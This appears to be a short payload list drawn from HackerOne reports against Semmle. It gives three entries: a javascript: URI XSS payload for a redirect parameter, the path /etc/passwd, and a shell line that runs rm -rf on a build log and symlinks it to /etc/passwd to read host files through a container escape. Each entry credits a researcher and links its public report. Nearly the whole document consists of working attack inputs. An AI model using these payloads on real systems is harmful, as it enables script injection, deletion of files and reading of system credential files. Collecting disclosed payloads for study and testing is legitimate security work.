# Semmle

3 payloads.

### `c5dd0fa2`

```
https://target.com/?redirect=javascript:prompt(document.domain
```

**Parameter:** `redirect`
— [DOMXSS in redirect param](https://hackerone.com/reports/361287) · Semmle · [flamezzz](https://hackerone.com/flamezzz)

### `4ba618a5`

```
/etc/passwd
```

— [Worker container escape lead to arbitrary file reading in host machine](https://hackerone.com/reports/694181) · Semmle · [testanull](https://hackerone.com/testanull) · $2,000.0

### `a9ca77c6`

```
- rm -rf /opt/out/snapshot/log/build.log && ln -s /etc/passwd /opt/out/snapshot/log/build.log
```

— [Worker container escape lead to arbitrary file reading in host machine](https://hackerone.com/reports/694181) · Semmle · [testanull](https://hackerone.com/testanull) · $2,000.0
